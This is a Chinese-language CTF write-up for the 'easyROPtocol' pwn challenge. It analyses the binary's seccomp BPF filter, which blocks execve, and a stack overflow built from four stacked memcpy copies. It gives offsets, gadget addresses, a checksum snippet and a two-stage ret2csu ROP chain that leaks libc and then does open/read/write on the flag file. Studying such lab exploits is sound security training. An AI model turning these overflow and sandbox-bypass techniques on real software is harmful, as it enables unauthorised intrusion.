# Speedrun：easyROPtocol（seccomp 沙箱 + 4 槽 message 双阶段 ORW）

> 题型：**程序自带 seccomp BPF + 多次 memcpy 叠加溢出 → 只能 open/read/write 读文件**
> 亮点：单条 message 只有 0x1000 字节、栈帧 0x3018，看似凑不满；实际每次 memcpy 只增长
> **0xfe8**（不是 0x1000），4 条正好把 saved RIP 顶掉，chain 落在第 4 条 message 的 `+0x88`
> 出处：V&N 2022 校赛 `easyROPtocol`（附件自带 `libc-2.31.so`）

---

## 0. 一句话结论

```text
amd64 / No PIE(EXEC) / NX / Partial RELRO / 无 canary / stripped / 14968 B

init@0x401296:
  prctl(38, 1, 0, 0, 0)                  # PR_SET_NO_NEW_PRIVS
  prctl(22, 2, &sock_fprog)              # SECCOMP_MODE_FILTER，8 条 BPF 写死在代码里

BPF 放行 open/read/write/exit 等全部 syscall，只 KILL：
  arch != 0xc000003e（非 x86_64）
  nr >= 0x40000000（x32 ABI；nr == 0xffffffff 除外）
  nr == 59（execve）
=> system("/bin/sh") 没用，必须 ORW

选项 3 @0x401830:
  buf = rbp - 0x3020
  for seq in 1 / 0x1001 / 0x2001 / 0x3001:
      memcpy(buf + strlen(buf), slot + 0x18, 0x1000)   # strlen 每次 +0xfe8
  write(1, buf, strlen(buf)); write(1, "Done.\n")
  add rsp, 0x3018; pop rbx; pop rbp; ret

memcpy dest = 0 / 0xfe8 / 0x1fd0 / 0x2fb8
saved RIP   = buf + 0x3028  ->  第 4 条 message 的 +0x88
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/sandbox_seccomp'
file easyroptocol
readelf -hW easyroptocol | grep Type                 # EXEC -> No PIE
readelf -lW easyroptocol | grep -E 'LOAD|STACK'      # GNU_STACK=RWE? 否，NX 开
objdump -d -M intel easyroptocol | sed -n '/401296:/,/4013f3:/p'   # init: 两条 prctl + 8 条 BPF
objdump -d -M intel easyroptocol | sed -n '/401830:/,/401a5d:/p'   # 选项 3
```

`init` 里的 BPF 不是 `.rodata` 数组，而是 16 条 `mov` 立即数直接铺在栈上
（`struct sock_filter { u16 code; u8 jt; u8 jf; u32 k; }`，每条 8 字节）：

```text
idx  code  jt jf  k           含义
 0   0x20   0  0  4           ld  [4]              ; arch
 1   0x15   0  5  0xc000003e  jeq x86_64 ? next : KILL
 2   0x20   0  0  0           ld  [0]              ; nr
 3   0x35   0  1  0x40000000  jge 0x40000000 ? next : idx5
 4   0x15   0  2  0xffffffff  jeq -1 ? idx5 : KILL ; x32 基本全杀
 5   0x15   1  0  59          jeq execve ? KILL : ALLOW
 6   0x06   0  0  0x7fff0000  ret ALLOW
 7   0x06   0  0  0           ret KILL
```

注意 `idx5` 的 `jt=1` 是**跳到 idx7（KILL）**，不是放行；`open`(2)、`read`(0)、
`write`(1)、`exit_group`(231) 都落在 `idx6` 的 ALLOW。

菜单（`main@0x401a5e`，每轮先打 banner 再打 4 行菜单）：

```text
1. Your tcp message.    -> malloc(0x1000) + read(0, chunk, 0x1000) + 两道校验
2. Delete the message.  -> "Which?" + read(0, buf, 8) + atoi -> free(slot[idx])
3. Submit the message.  -> 见 §0 的 memcpy 循环
4. Quit.
```

关键点：菜单读入是 `read(0, buf, 8); atoi(buf)`，**不是 readline**。
发送时必须一次写满 8 字节（`b"1\n" + b"\x00"*6`），否则后续消息的头部会被
这次 `read(8)` 吞掉，或者 `read(0x1000)` 被 TCP 分段截断。

---

## 2. message 格式（两道校验）

`check1@0x4014af`（字段合法性）+ `check2@0x401590`（XOR 校验和）：

| 偏移 | 条件 | 说明 |
| --- | --- | --- |
| `+0x00` | `== 0x766e` | `"nv"` |
| `+0x02` | `== 0x28b7` | magic |
| `+0x04` | `!= 0` 且 `== 期望序号` | 提交时按 `1 / 0x1001 / 0x2001 / 0x3001` 匹配 |
| `+0x08` | `!= 0` | 任意 |
| `+0x0c` | `(u16 & 0xf) * 4 == 0x18` | 填 `6` 走 memcpy；填 `5` 走 `strcpy` |
| `+0x0e` | `!= 0` | 任意 |
| `+0x10` | `== checksum` | 见下 |
| `+0x12` | `== 0` | 强制 memcpy 分支 |
| `+0x14` | `!= 0` | 同上 |
| `+0x16` | `== 0xffff` | 同上 |
| `+0x18` | payload | memcpy 的源起点 |

校验和覆盖**整条 0x1000 字节**，跳过 word[8]（也就是 `+0x10` 自身），
再异或 `b"fakeipheadfa"` 的 6 个 LE u16：

```python
import struct

KEY = b"fakeipheadfa"
KEY_XOR = 0
for i in range(0, 12, 2):
    KEY_XOR ^= struct.unpack("<H", KEY[i:i + 2])[0]


def checksum(msg: bytes) -> int:
    s = 0
    for i, w in enumerate(struct.unpack("<2048H", msg)):
        if i == 8:          # +0x10 自身不参与
            continue
        s ^= w
    return s ^ KEY_XOR
```

因此 chain 可以先摆好，最后再算 `+0x10`；顺序反了必失败。

---

## 3. 为什么是 0xfe8，而不是 0x1000

`malloc(0x1000)` 的 chunk 实际大小是 `0x1010`，`read` 只写入 `slot..slot+0xfff`。
`memcpy(buf + strlen(buf), slot + 0x18, 0x1000)` 读到 `slot+0x1017`，其中
`slot+0x1000 .. slot+0x1007` 是下一个 chunk 的 `prev_size`（分配状态下为 0），
所以每条消息拷进来的 0x1000 字节在第 **0xfe8** 个字节处先遇到 NUL：

```text
copy1: dest 0      strlen 变 0xfe8
copy2: dest 0xfe8  strlen 变 0x1fd0
copy3: dest 0x1fd0 strlen 变 0x2fb8
copy4: dest 0x2fb8 -> 覆盖 saved RIP = 0x3028
```

3 条只有 `0x2fb8 < 0x3028`，够不到返回地址；必须凑满 4 条。
chain 在消息内的位置：`0x3028 - 0x2fb8 + 0x18 = 0x88`。

> gdb 实测（`b *0x401a54`）：`dest_off = 0 / 0xfe8 / 0x1fd0 / 0x2fb8`，
> `$rbp-0x3020+0x3028` 正好是第 4 条消息的 `+0x88`。

---

## 4. 两阶段链（全 CSU，不依赖 `pop rdx;ret`）

`libc-2.31` 没有 `pop rdx; ret`，而本机 2.43 也没有 `pop rdx; pop rbx`，
所以统一用 `__libc_csu_init` 的两段 gadget：

```text
csu_pop  @0x401baa : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call @0x401b90 : mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
```

一个调用块固定 15 个 qword：

```text
csu_pop, rbx=0, rbp=1, r12=edi, r13=rsi, r14=rdx, r15=&函数指针,
csu_call, pad(被 add rsp,8 吃掉), 6 个 junk(被 pop 掉)
```

`rbp=1` 让 `call` 只执行一次；`call` 之后的 `add rsp,8` 就是那个 `pad` 槽。

### stage 1：泄漏 libc，回 main

```text
csu(write@got, edi=1, rsi=write@got, rdx=8)   # write(1, write@got, 8)
ret; main(0x401a5e)                           # ret 是栈对齐垫片
```

实测 `rbp % 16 == 0`：CSU 块执行完后 `rsp % 16 == 0`，直接 ret 到 main 会
在 libc 的 `movaps` 上崩，所以必须多放一个 `ret`（`0x40101a`）再进 main。

### stage 2：删 slot3、重建、ORW

```text
1) 选项 2 -> 索引 3        # free(chunk4)，chunk4 与 top 相邻 -> 并进 top
2) 选项 1 -> 新消息(seq=0x3001)
      malloc(0x1000) 从 top 原样切回 chunk4 的地址，链仍在 +0x88
3) 选项 3
```

stage2 链（7 个 CSU 块）：

```text
read(0, 0x404700, 0x40)                  # 收 open/exit 指针 + 3 个候选路径
open(0x404718, 0, 0)                     # "/flag"
open(0x404720, 0, 0)                     # "flag"
open(0x404728, 0, 0)                     # "flag.txt"
read(3, 0x404800, 0x100)
write(1, 0x404800, 0x100)
exit(0)                                  # 通过 [0x404710] 调用，避免栈对齐问题
```

`0x404700` 在 RW LOAD 覆盖的页内（`0x403e10..0x405000`），可读可写：

```text
+0x00  open 的绝对地址（stage1 泄漏后算出来）
+0x10  exit 的绝对地址
+0x18  "/flag\0"
+0x20  "flag\0"
+0x28  "flag.txt\0"
```

这样做的意义：**open/exit 的地址由链里的 `read` 动态写入 bss**，
同一份 exp 在本地（系统 libc 2.43）和远端（附件 2.31）都能跑；
stage1 只负责把 libc 基址算出来。

---

## 5. 坑点清单

1. **菜单 `read(0, buf, 8)`**：必须在一次 `send` 里写满 8 字节
   （`b"1\n" + b"\x00"*6`）。只发 `b"1\n"` 时，下一次 `read(0x1000)` 可能
   先拿到消息头，菜单 `read(8)` 也可能多吞 6 字节，直接 desync。
2. **增长是 0xfe8 不是 0x1000**：chunk 尾部的 `prev_size` 为 0，导致每条
   memcpy 的 `strlen` 只增加 0xfe8。3 条顶不到 saved RIP，必须 4 条。
3. **chain 必须在第 4 条消息的 `+0x88`**：`0x3028 - 0x2fb8 + 0x18`。
   放到 `+0x40` 会落在 saved rbp 上，`ret` 直接跳 `0x4141...`。
4. **不要删前 3 条消息**：只有第 4 个 chunk 与 top 相邻。删 slot0~2 会触发
   consolidate/split，把下一个 chunk 的 `prev_size` 写成非 0，增长变成 0x1000，
   chain 落点整体偏 0x48，必崩。只删 slot3 再 malloc，才能拿回同一地址且尾部仍是 0。
5. **栈对齐**：CSU 块之后、`main` 之前必须加一个 `ret`。否则 `main` 内部的
   libc 调用可能因 `movaps` 要求 16 字节对齐而失败。
6. **`libc-2.31` 没有 `pop rdx; ret`**：统一 CSU，不要临时换 gadget。
7. **回显长度不可信**：选项 3 的 `i/counter` 局部变量就在 `buf+0x3008`，
   `strlen(buf)` 只有 0x3009；解析输出用 `recvuntil("Done.\n")`，不要数 A 的个数。
8. **重入 main 会再装一次 seccomp**：`PR_SET_NO_NEW_PRIVS` 已经是 1，
   重复 `prctl(PR_SET_SECCOMP, FILTER)` 合法，slot 表不会被清空。
9. **本地 libc 自动取**：`io.libs()` 返回 `{路径: 基址}`，用
   `next(p for p in io.libs() if p.endswith("libc.so.6"))` 取路径；
   远端固定用附件 `libc-2.31.so`。
10. **pwntools `process` 没有 `sendall`**：用 `send`；消息和菜单合并成一次
    发送，尽量让 `read(0x1000)` 一次拿全。
11. **CET 标记是干扰项**：二进制 `SHSTK/IBT: Enabled`，但 WSL / 常见靶机
    没有启用 shadow stack；如果真启用 SHSTK，任何 ROP 都会失败（本题实测可打）。
12. **flag 路径**：附件没有 README，链里依次尝试 `/flag`、`flag`、`flag.txt`；
    本地用临时目录里的 `flag.txt` 验证。

---

## 6. 运行与实测

```bash
cd '/home/yfhd5/Pwn Writeups'
.venv/bin/python sandbox_seccomp/24_easyroptocol_exp.py
# 远端（把 HOST/PORT 换成靶机）：
.venv/bin/python sandbox_seccomp/24_easyroptocol_exp.py remote HOST PORT
```

本地实测（连续 5 次全部成功）：

```text
[+] write@libc = 0x757396128bd0, libc base = 0x757396000000
[+] flag: __PWNED__{easyroptocol_local_ok}
[*] Process ... stopped with exit code 0
```

---

## 7. 识别卡

```text
prctl(38,1) + prctl(22,2,&prog) 两次调用
+ 一段 8 字节一条、末尾 0x7fff0000 / 0 的 BPF
+ 多条消息按长度顺序 memcpy 到同一个栈缓冲
=> seccomp + 叠加溢出：先 dump BPF，确认 execve 被拦，再写 ORW ROP
```

| 关键量 | 值 |
| --- | --- |
| 栈缓冲 | `rbp-0x3020` |
| 每条 message 增长 | `0xfe8` |
| 4 次 memcpy dest | `0 / 0xfe8 / 0x1fd0 / 0x2fb8` |
| saved RIP | `buf+0x3028` |
| chain 在消息 4 的偏移 | `+0x88` |
| 消息序号 | `1 / 0x1001 / 0x2001 / 0x3001` |
| 校验和 key | `b"fakeipheadfa"`（6 个 LE u16 异或） |
| CSU gadget | `csu_pop=0x401baa`、`csu_call=0x401b90` |
| 对齐垫片 / main | `ret=0x40101a`、`main=0x401a5e` |
| GOT | `write@got=0x404028`、`read@got=0x404040` |
| bss 暂存区 | `0x404700`（指针/路径）、`0x404800`（读缓冲） |
| 沙箱 | 8 条 BPF：非 x86_64 / x32 / execve(59) -> KILL，其余 ALLOW |

